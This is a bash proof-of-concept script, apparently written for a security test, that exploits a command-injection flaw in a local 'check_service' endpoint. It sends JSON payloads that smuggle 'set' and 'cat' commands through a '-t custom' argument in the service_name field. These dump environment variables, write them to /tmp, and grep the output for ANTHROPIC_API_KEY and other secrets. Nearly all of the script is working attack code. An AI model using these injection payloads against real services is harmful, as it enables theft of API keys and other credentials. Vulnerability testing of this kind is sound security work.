#!/bin/bash

# POC: API Credential Exfiltration via Environment Variable Dumping
# Demonstrates how the command injection vulnerability can be used to dump environment variables
# and extract sensitive API credentials (ANTHROPIC_API_KEY)

TARGET_URL="http://localhost:8080/check_service"

echo "=== API Credential Exfiltration via Command Injection POC ==="
echo ""
echo "Target: $TARGET_URL"
echo "Attack Vector: Command injection via -t custom flag to execute 'set' command"
echo ""

# Attack 1: Direct environment variable dump using 'set' command
echo "[+] Attack 1: Dumping all environment variables with 'set' command"
echo "    Payload: {\"service_name\": \"-t custom set\"}"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "-t custom set"}')

echo "Response received:"
echo "$RESPONSE"
echo ""

# Extract ANTHROPIC_API_KEY from response if present
if echo "$RESPONSE" | grep -q "ANTHROPIC_API_KEY"; then
    echo "[SUCCESS] API Key found in response!"
    API_KEY=$(echo "$RESPONSE" | grep -oP 'ANTHROPIC_API_KEY=\K[^"]*' | head -1)
    if [ ! -z "$API_KEY" ]; then
        echo "[CRITICAL] Exposed credential: ANTHROPIC_API_KEY=$API_KEY"
    else
        # Alternative extraction if the above fails
        API_KEY=$(echo "$RESPONSE" | grep "ANTHROPIC_API_KEY" | head -1)
        echo "[CRITICAL] Exposed credential found: $API_KEY"
    fi
else
    echo "[INFO] Checking if set command output is in response..."
    if echo "$RESPONSE" | grep -q "declare -"; then
        echo "[SUCCESS] Environment variables dumped in response (declare format)"
        echo "$RESPONSE" | grep -E "declare -.*ANTHROPIC_API_KEY|ANTHROPIC_API_KEY=" | head -3
    fi
fi

echo ""
echo "[+] Attack 2: File-based environment dump (creates temporary file)"
echo "    Payload: {\"service_name\": \"-t custom set>/tmp/env_dump_poc\"}"
echo ""

RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "-t custom set>/tmp/env_dump_poc"}')

echo "Response: $RESPONSE2"
echo ""

# Verify the attack vector works
echo "[+] Verification: Attempting to read dumped environment file"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "-t custom cat /tmp/env_dump_poc"}')

echo "Attempt to read dumped file:"
if echo "$RESPONSE3" | grep -q "ANTHROPIC_API_KEY"; then
    echo "[SUCCESS] Credentials exposed via file dump!"
    echo "$RESPONSE3" | grep "ANTHROPIC_API_KEY"
else
    echo "File read response: $RESPONSE3"
fi

echo ""
echo "=== POC Complete ==="
echo "[!] This POC demonstrates that command injection allows full environment variable exfiltration"
echo "[!] Any API keys, database passwords, or secrets stored in environment variables are compromised"